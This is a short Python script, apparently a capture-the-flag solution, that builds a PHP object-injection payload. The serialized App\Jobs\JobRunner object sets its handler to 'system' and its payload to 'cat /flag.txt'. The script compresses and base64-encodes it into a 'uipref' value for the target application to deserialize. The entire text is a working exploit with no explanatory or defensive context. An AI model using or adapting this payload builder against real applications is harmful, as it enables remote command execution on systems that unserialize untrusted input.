import base64, zlib

HANDLER = "system"
PAYLOAD = "cat /flag.txt"

def pack(s: str) -> str:
    co = zlib.compressobj(level=9, wbits=-15)
    comp = co.compress(s.encode("utf-8")) + co.flush()
    return base64.b64encode(comp).decode("ascii")

ser = (f'O:18:"App\Jobs\JobRunner":3:'
       f'{{s:7:"handler";s:{len(HANDLER)}:"{HANDLER}";'
       f's:7:"payload";s:{len(PAYLOAD)}:"{PAYLOAD}";'
       f's:7:"autoRun";b:1;}}')
uipref = pack(ser)
print(uipref)
